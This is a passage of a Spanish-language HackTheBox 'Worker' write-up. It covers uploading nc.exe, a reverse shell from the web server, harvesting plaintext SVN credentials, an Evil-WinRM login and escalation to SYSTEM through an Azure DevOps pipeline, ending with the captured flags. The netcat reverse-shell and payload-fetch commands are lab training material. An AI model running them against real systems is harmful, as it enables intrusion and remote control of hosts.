    <p>Si le damos en Run vemos que podemos construir una.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/15.png" />
</p>

<ul>
  <li>
    <p>Bueno nos da un error y esto es por que al parecer la otra rama fue eliminada yo creo entonces tenemos que hacerlo rápido lo que vamos hacer es crear todo otra vez y subir el <code class="language-plaintext highlighter-rouge">cmd.aspx</code> hacer los mismos pasos pero ahora con la nueva rama.</p>
  </li>
  <li>
    <p>Y vemos que ya se puede.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/16.png" />
</p>

<ul>
  <li>Bueno ahora solo falta agregar el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n1</span>
10.10.10.203 devops.worker.htb dimension.worker.htb alpha.worker.htb
</code></pre></div></div>

<ul>
  <li>Y listo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/17.png" />
</p>

<ul>
  <li>
    <p>Ahora vamos a ganar acceso.</p>
  </li>
  <li>
    <p>Vamos a usar el <code class="language-plaintext highlighter-rouge">netcat</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
➜  content python3 <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora simplemente hacemos una petición con <code class="language-plaintext highlighter-rouge">curl</code> para descargamos el nc.exe y ponerlo en esa ruta del sistema.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/18.png" />
</p>

<ul>
  <li>Ahora ya nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd tuip 443
</code></pre></div></div>

<ul>
  <li>Nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 50333
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1282]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami
<span class="nb">whoami
</span>iis apppool<span class="se">\d</span>efaultapppool

c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
</code></pre></div></div>

<h2 id="shell-as-robisl">Shell as robisl</h2>

<ul>
  <li>Aquí vemos unidades logicas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;net share
net share

Share name   Resource                        Remark

<span class="nt">-------------------------------------------------------------------------------</span>
C<span class="nv">$ </span>          C:<span class="se">\ </span>                            Default share
IPC<span class="nv">$ </span>                                        Remote IPC
W<span class="nv">$ </span>          W:<span class="se">\ </span>                            Default share
ADMIN<span class="nv">$ </span>      C:<span class="se">\W</span>indows                      Remote Admin
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;w:
w:

W:<span class="se">\&gt;</span><span class="nb">dir
dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\</span>

2020-06-16  18:59    &lt;DIR&gt;          agents
2020-03-28  15:57    &lt;DIR&gt;          AzureDevOpsData
2020-04-03  11:31    &lt;DIR&gt;          sites
2020-06-20  16:04    &lt;DIR&gt;          svnrepos
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               4 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">passwd</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\&gt;</span><span class="nb">cd </span>svnrepos
<span class="nb">cd </span>svnrepos

W:<span class="se">\s</span>vnrepos&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\s</span>vnrepos

2020-06-20  16:04    &lt;DIR&gt;          <span class="nb">.</span>
2020-06-20  16:04    &lt;DIR&gt;          ..
2020-06-20  11:29    &lt;DIR&gt;          www
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               3 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\s</span>vnrepos&gt;cd www
<span class="nb">cd </span>www

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww

2020-06-20  11:29    &lt;DIR&gt;          <span class="nb">.</span>
2020-06-20  11:29    &lt;DIR&gt;          ..
2020-06-20  15:30    &lt;DIR&gt;          conf
2020-06-20  15:52    &lt;DIR&gt;          db
2020-06-20  11:29                 2 format
2020-06-20  11:29    &lt;DIR&gt;          hooks
2020-06-20  11:29    &lt;DIR&gt;          locks
2020-06-20  11:29               251 README.txt
               2 File<span class="o">(</span>s<span class="o">)</span>            253 bytes
               6 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww&gt;cd conf
<span class="nb">cd </span>conf

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf

2020-06-20  15:30    &lt;DIR&gt;          <span class="nb">.</span>
2020-06-20  15:30    &lt;DIR&gt;          ..
2020-06-20  11:29             1112 authz
2020-06-20  11:29               904 hooks-env.tmpl
2020-06-20  15:27             1031 passwd
2020-04-04  20:51             4454 svnserve.conf
               4 File<span class="o">(</span>s<span class="o">)</span>          7501 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
</code></pre></div></div>

<ul>
  <li>Vemos usuarios y contraseñas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;type passwd
<span class="nb">type </span>passwd
<span class="c">### This file is an example password file for svnserve.</span>
<span class="c">### Its format is similar to that of svnserve.conf. As shown in the</span>
<span class="c">### example below it contains one section labelled [users].</span>
<span class="c">### The name and password for each user follow, one account per line.</span>

<span class="o">[</span><span class="nb">users</span><span class="o">]</span>
nathen <span class="o">=</span> wendel98
nichin <span class="o">=</span> fqerfqerf
nichin <span class="o">=</span> asifhiefh
noahip <span class="o">=</span> player
nuahip <span class="o">=</span> wkjdnw
oakhol <span class="o">=</span> bxwdjhcue
owehol <span class="o">=</span> supersecret
paihol <span class="o">=</span> painfulcode
parhol <span class="o">=</span> gitcommit
pathop <span class="o">=</span> iliketomoveit
pauhor <span class="o">=</span> nowayjose
payhos <span class="o">=</span> icanjive
perhou <span class="o">=</span> elvisisalive
peyhou <span class="o">=</span> ineedvacation
phihou <span class="o">=</span> pokemon
quehub <span class="o">=</span> pickme
quihud <span class="o">=</span> kindasecure
rachul <span class="o">=</span> guesswho
raehun <span class="o">=</span> idontknow
ramhun <span class="o">=</span> thisis
ranhut <span class="o">=</span> getting
rebhyd <span class="o">=</span> rediculous
reeinc <span class="o">=</span> iagree
reeing <span class="o">=</span> tosomepoint
reiing <span class="o">=</span> isthisenough
renipr <span class="o">=</span> dummy
rhiire <span class="o">=</span> <span class="nb">users
</span>riairv <span class="o">=</span> canyou
ricisa <span class="o">=</span> seewhich
robish <span class="o">=</span> onesare
robisl <span class="o">=</span> wolves11
robive <span class="o">=</span> andwhich
ronkay <span class="o">=</span> onesare
rubkei <span class="o">=</span> the
rupkel <span class="o">=</span> sheeps
ryakel <span class="o">=</span> imtired
sabken <span class="o">=</span> drjones
samken <span class="o">=</span> aqua
sapket <span class="o">=</span> hamburger
sarkil <span class="o">=</span> friday

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
</code></pre></div></div>

<ul>
  <li>Vemos que el único usuario de interés es <code class="language-plaintext highlighter-rouge">robisl</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;dir C:<span class="se">\U</span>sers<span class="se">\</span>
<span class="nb">dir </span>C:<span class="se">\U</span>sers<span class="se">\</span>
 Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 32D6-9041

 Directory of C:<span class="se">\U</span>sers

2020-07-07  17:53    &lt;DIR&gt;          <span class="nb">.</span>
2020-07-07  17:53    &lt;DIR&gt;          ..
2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5
2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5 Classic
2020-08-18  00:33    &lt;DIR&gt;          Administrator
2020-03-28  15:01    &lt;DIR&gt;          Public
2020-07-22  01:11    &lt;DIR&gt;          restorer
2020-07-08  19:22    &lt;DIR&gt;          robisl
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               8 Dir<span class="o">(</span>s<span class="o">)</span>  10459025408 bytes free

W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
</code></pre></div></div>

<ul>
  <li>El usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;net user robisl
net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-04-05 21:27:26
Password expires             Never
Password changeable          2020-04-05 21:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2020-08-03 12:41:02

Logon hours allowed          All

Local Group Memberships      *Production           *Remote Management Use
Global Group memberships     *None
The command completed successfully.


W:\svnrepos\www\conf&gt;
</span></code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ahora ya nos podemos conectar y ver la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.10.10.203 <span class="nt">-u</span> <span class="s1">'robisl'</span> <span class="nt">-p</span> <span class="s1">'wolves11'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>worker<span class="se">\r</span>obisl
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
2ce8a9d7ff7736acc3469f7274b2006a
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>No vemos ningún privilegio ni nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all

USER INFORMATION
<span class="nt">----------------</span>

User Name     SID
<span class="o">=============</span> <span class="o">==============================================</span>
worker<span class="se">\r</span>obisl S-1-5-21-3082756831-2119193761-3468718151-1330


GROUP INFORMATION
<span class="nt">-----------------</span>

Group Name                             Type             SID                                            Attributes
<span class="o">======================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">==================================================</span>
Everyone                               Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
WORKER<span class="se">\P</span>roduction                      Alias            S-1-5-21-3082756831-2119193761-3468718151-1018 Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\R</span>emote Management Users        Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\U</span>sers                          Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>ETWORK                   Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\A</span>uthenticated Users       Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\T</span>his Organization         Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\L</span>ocal account             Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>TLM Authentication       Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="se">\M</span>edium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>

<ul>
  <li>Si recordamos tenemos credenciales y si nos conectamos al <code class="language-plaintext highlighter-rouge">devops.worker.htb</code> con las credenciales son validas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/19.png" />
</p>

<ul>
  <li>Formamos parte del grupo <code class="language-plaintext highlighter-rouge">Build Administrators</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/20.png" />
</p>

<ul>
  <li>
    <p>Podemos crear un <code class="language-plaintext highlighter-rouge">Pipeline</code>.</p>
  </li>
  <li>
    <p>Después le damos en <code class="language-plaintext highlighter-rouge">PartsUnlimited</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/21.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/22.png" />
</p>

<ul>
  <li>
    <p>Podemos hacer un script en YAML.</p>
  </li>
  <li>
    <p>Si vemos en la parte de script se están ejecutando comandos podemos hacer un <code class="language-plaintext highlighter-rouge">whoami</code> para ver quien es el que esta ejecutando el script.</p>
  </li>
  <li>
    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Save and Rune</code> vemos el mismo problema que teníamos antes.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/23.png" />
</p>

<ul>
  <li>Así que vamos a crear una nueva rama.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/24.png" />
</p>

<ul>
  <li>Pero obtenemos un error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/25.png" />
</p>

<ul>
  <li>Vemos que nos dicen sobre el <code class="language-plaintext highlighter-rouge">pool</code> que no existe default a si que tenemos que buscar uno que exista.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/26.png" />
</p>

<ul>
  <li>Vamos a cambiar el <code class="language-plaintext highlighter-rouge">pool</code> y hacemos lo mismo de cambiar la rama.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/27.png" />
</p>

<ul>
  <li>Si le damos a <code class="language-plaintext highlighter-rouge">Run</code> vemos que funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/28.png" />
</p>

<ul>
  <li>Si le damos <code class="language-plaintext highlighter-rouge">click</code> al <code class="language-plaintext highlighter-rouge">#....</code> vemos que lo ejecuta el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/29.png" />
</p>

<ul>
  <li>
    <p>Vamos a editar el <code class="language-plaintext highlighter-rouge">Pipeline</code> para hacer todo lo anterior y enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
  </li>
  <li>
    <p>En mi caso volví a subir el <code class="language-plaintext highlighter-rouge">nc.exe</code> así que nos enviamos una reverse ahora.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/30.png" />
</p>

<ul>
  <li>
    <p>Hacemos todo el proceso de antes de crear una nueva rama.</p>
  </li>
  <li>
    <p>Después de que se procese todo nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 49935
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1282]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

W:<span class="se">\a</span>gents<span class="se">\a</span>gent11<span class="se">\_</span>work<span class="se">\8\s</span><span class="o">&gt;</span><span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem

W:<span class="se">\a</span>gents<span class="se">\a</span>gent11<span class="se">\_</span>work<span class="se">\8\s</span><span class="o">&gt;</span>
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
d3a78316ac7f36f03c0e6dd2ada48da9
C:<span class="se">\&gt;</span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>